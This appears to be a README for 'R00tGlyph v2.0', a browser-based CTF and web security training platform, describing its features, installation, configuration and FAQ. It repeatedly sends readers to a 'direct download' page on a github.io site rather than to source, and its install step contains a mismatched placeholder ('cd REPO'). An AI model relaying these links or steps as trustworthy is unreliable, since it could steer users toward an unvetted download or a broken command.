# R00tGlyph v2.0 - web security training platform 2026

> **R00tGlyph is a browser-based CTF and security training platform for practical learning, and version 2.0 adds challenge-led practice, team collaboration, and a more structured learning path.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/coleisaac44/rootglyph-web-security-hub?style=flat-square)](https://github.com/coleisaac44/rootglyph-web-security-hub)

---

<p align="center">
  <a href="https://coleisaac44.github.io/rootglyph-web-security-hub/">
    <img src="https://img.shields.io/badge/Download-R00tGlyph%20Latest-brightgreen?style=for-the-badge" alt="Download R00tGlyph">
  </a>
</p>

> **[Direct Download - R00tGlyph v2.0](https://coleisaac44.github.io/rootglyph-web-security-hub/)**

---

[Download Latest Build](https://coleisaac44.github.io/rootglyph-web-security-hub/)

---

## What is R00tGlyph?

R00tGlyph provides a web-based training space for Capture the Flag practice and web security skill building. It is aimed at learners who want to work through realistic tasks, study common vulnerability categories, and strengthen their approach through repeatable, guided exercises.

It fits solo study, classroom environments, and competitive team events. Built-in score tracking, hints, and walkthroughs give participants a clear way to practice, while organizers gain tools for session oversight and progress monitoring.

---

## Highlights

- 188 challenges organized across 9 vulnerability categories
- Team-based CTF gameplay for collaborative training sessions
- Progressive hints to support learners at different skill levels
- Detailed solutions for reviewing approaches after each challenge
- Global and team scoreboards for tracking performance
- Admin panel for analytics and user management
- Sandboxed command execution for controlled task handling
- Offline mode support for flexible deployment scenarios

---

## Installation

Clone the repository and open the project in your preferred web stack workflow.

    git clone https://github.com/coleisaac44/rootglyph-web-security-hub.git
    cd REPO

If you are using Docker, build and start the containerized environment from the project root. For local development, launch the Flask-based app with your usual Python environment and open it in a browser once the server is running.

---

## How to Use It

R00tGlyph can be used for guided challenge progression, self-paced practice, or team competition sessions.

Typical workflow:

1. Sign in as a learner or join a team session.
2. Select a challenge from the available categories.
3. Work through the task, using hints only when needed.
4. Submit progress and review your placement on the scoreboard.
5. Check the solution material after finishing a challenge to compare methods.

For organizers, the admin panel provides access to user management and activity insights, which can help with running events, tracking participation, and reviewing platform usage.

---

## Configuration

Configuration is typically handled through the application environment and deployment setup. If you run the platform with Docker, use the container settings and environment variables defined for your deployment. For local installs, keep app settings alongside the Flask project files and update them before startup as needed.

Example environment-style settings:

    FLASK_ENV=development
    HOST=0.0.0.0
    PORT=5000

---

## Requirements

- Web browser for accessing the platform
- Web hosting or local runtime capable of serving the application
- Flask-compatible Python environment for local deployment
- Docker support if using containerized setup
- Storage for challenge content, user data, and scoreboard records
- Network access for online usage; offline mode is supported where deployed

---

## FAQ

**How do I get updates?**  
Use the latest release or build link above and redeploy the current package when a new version is published.

**Can I run it offline?**  
Yes, offline mode support is included, which makes it suitable for isolated labs or training environments.

**Where are scoreboards managed?**  
Scoreboard views are part of the platform, while admin controls are available through the admin panel.

**What if I need to adjust settings?**  
Check your deployment configuration, environment variables, and Flask app settings before launch.

**Who is this for?**  
It is intended for learners, instructors, and teams who want practical CTF-style security training in a browser-based environment.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
